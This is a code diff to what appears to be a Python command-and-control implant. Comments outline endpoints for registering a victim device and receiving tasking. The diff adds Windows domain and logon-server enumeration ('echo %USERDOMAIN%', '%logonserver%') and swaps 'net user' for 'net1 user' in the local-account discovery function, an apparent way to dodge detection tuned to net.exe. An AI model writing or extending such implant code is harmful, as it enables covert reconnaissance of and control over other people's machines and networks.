@@ -35,6 +35,12 @@ library, or drop it to disk with requests
 """
 
 """
+TODO: more enumeration
+echo %USERDOMAIN%
+echo %logonserver%
+"""
+
+"""
 Endpoints to implement:
 /register : POST JSON of device_metadata ; return token
 /info     : GET with token ; return tasking (if any)
@@ -103,12 +109,12 @@ def get_device_metadata():
 
 def get_local_user_accounts():
     """
-        Returns local accounts by parsing 'net user' output.
+        Returns local accounts by parsing 'net1 user' output.
     """
     users = {"local_accounts": []}
 
     try:
-        proc = subprocess.run(["net", "user"], capture_output=True, text=True, check=True)
+        proc = subprocess.run(["net1", "user"], capture_output=True, text=True, check=True)
         out = proc.stdout
 
         # 'net user' prints a header, then user names in columns, then a footer.
